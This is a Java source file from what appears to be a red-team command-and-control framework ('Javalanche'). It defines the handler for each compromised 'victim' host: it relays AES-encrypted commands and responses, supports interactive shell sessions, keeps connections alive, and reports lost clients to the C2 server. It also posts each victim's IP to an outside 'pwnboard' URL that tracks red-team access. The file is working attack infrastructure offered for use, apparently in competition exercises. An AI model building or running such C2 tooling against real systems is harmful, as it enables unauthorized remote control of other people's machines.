package Servers.Beacon;

import Servers.Duplexer;
import Servers.keepAlive;
import Servers.encryption.aes.*;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;

public class BeaconClientHandler implements Runnable{
    // IP address of the client
    private String IPAddress;

    // Pointer to the duplexer that is used to send/receive with client
    private Duplexer duplexer;

    // Pointer back to the Beacon Server that is associated with this client
    private BeaconServer beaconServer;

    // Operating System of the client
    private String os;

    // Sentinel = true when this client is still active, when the client connection is lost Sentinel = false
    private Boolean sentinel = true;

    // Class and thread that is used to send KEEP_ALIVE messages to the client to keep the connection alive
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;

    // Object lock used to make sure that this thread is able to safetly access the duplexer
    private Object sendLock;

    // Boolean to determine whether or not this client is currently in a shell, or commands are just being distributed to many clients
    private Boolean isShell = false;

    // Object Lock used for notifying when messages have been received when the client is currently being used as a shell
    private Object shellLock;

    // Variables used to send HTTP Requests to pwnboard. pwnboard is used to keep track of what machines red team still has access to.
    private URI pwnboardUri = null;
    private URL pwnboardUrl = null;
    private HttpURLConnection pwnboardConnection = null;
    private String pwnboardData;
    private Object pwnBoardLock;
    private pwnBoardRequest pwnBoardRequestObject;

    // Class used to do rot13 encryption
    //private rot13 rot13;

    // Class used to do aes encryption
    private aes aes;

    /**
     * Use this Class to create a new thread to handle each victim connection
     * 
     * @param IPAddress IP address of the client (victim)
     * @param duplexer Pointer to the duplexer so that this thread can receive messages from the client
     * @param beaconServer Pointer to the Becon Server that this client is associated with
     * @param os Operating System of this client
     */
    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os, Object shellLock, aes aes){
        this.IPAddress = IPAddress;
        this.duplexer = duplexer;
        this.beaconServer = beaconServer;
        this.os = os;
        this.sendLock = new Object();
        this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, false, aes);
        this.keepAliveThread = new Thread(keepAliveClass);
        this.shellLock = shellLock;
        this.aes = aes;

        try{
            this.pwnboardUri = new URI("https://margs.salsas.bar/pwn/boxaccess");
            this.pwnboardUrl = this.pwnboardUri.toURL();
        } catch (URISyntaxException e){
            e.printStackTrace();
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        this.pwnboardData = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
        //this.pwnboardData = "{\"ip\": \"10.1.1.1\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
        this.pwnBoardLock = new Object();

        this.pwnBoardRequestObject = new pwnBoardRequest(pwnboardUrl, pwnboardConnection, pwnboardData, pwnBoardLock);
    }

    protected void quit(String reason) throws IOException{
        duplexer.close();
    }

    protected void setIsShell(Boolean value){
        this.isShell = value;
    }

    /**
     * Use this function to have the thread send a message to the client
     * 
     * @param message Message to be sent
     */
    protected void sendToClient(String message){
        if(sentinel){
            //message = rot13.encrypt(message);
            //String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
            //message = httpHeader + message;
            synchronized(sendLock){
                duplexer.send(aes.encrypt(message), true);
            }
        }
    }

    /**
     * Function used to handle anything that needs to happen when a client disconnects
     * Sends a message in the Beacon Server Terminal, Sends a message to the C2 Server, 
     * Adds a mesasge at the end of the response dictionary, and closes all of the
     * threads associated with this client. 
     * @param e - Error message stack trace to be printed. If no stack trace should be printed, e should be null
     */
    private void clientDisconnect(Exception e){
        sentinel = false;
        try{
            duplexer.close();
            keepAliveClass.stopKeepAlive();
        } catch (IOException d){
            d.printStackTrace();
        }
        beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
        beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
        System.out.println(IPAddress + " disconnected");
        if(e != null){
            e.printStackTrace();
        }
    }

    @Override
    public void run(){
        // Start the Thread to Send KEEP_ALIVE messages to the client every 30 seconds
        keepAliveThread.start();

        // Create a new thread responsible for updating pwnBoard
        Thread pwnBoardRequestThread = new Thread(pwnBoardRequestObject);
        pwnBoardRequestThread.start();

        String encrypted = "";
        String response = "";
        while(sentinel){ 
            try{
                try{
                    encrypted = duplexer.receive(true);
                } catch (java.lang.NumberFormatException e){
                    clientDisconnect(e);
                }
                
                response = aes.decrypt(encrypted);

                // When the linux client disconnects, for some reason is just sends a lot of null messages over and over
                if(response == null){
                    clientDisconnect(null);
                }

                // Every time we receive a message from our client, we want to notify pwnboard that we still have access to this machine
                synchronized(pwnBoardLock){
                    pwnBoardLock.notify();
                }


                
                if(!(response.equals("KEEP_ALIVE"))){
                    beaconServer.addDataToResponsesDictionaries(IPAddress, response);

                    // If this client is currently being used as a shell, notify the lock so that the server knows
                    // to return the responses immediately
                    if(isShell){
                        synchronized(shellLock){
                            shellLock.notify();
                        }
                    }
                }
            } catch(java.net.SocketException e){
                clientDisconnect(e);
            } 
            
            catch (IOException e){
                clientDisconnect(e);
            } catch (java.lang.NullPointerException e){
                clientDisconnect(e);
            }
        }
    }
}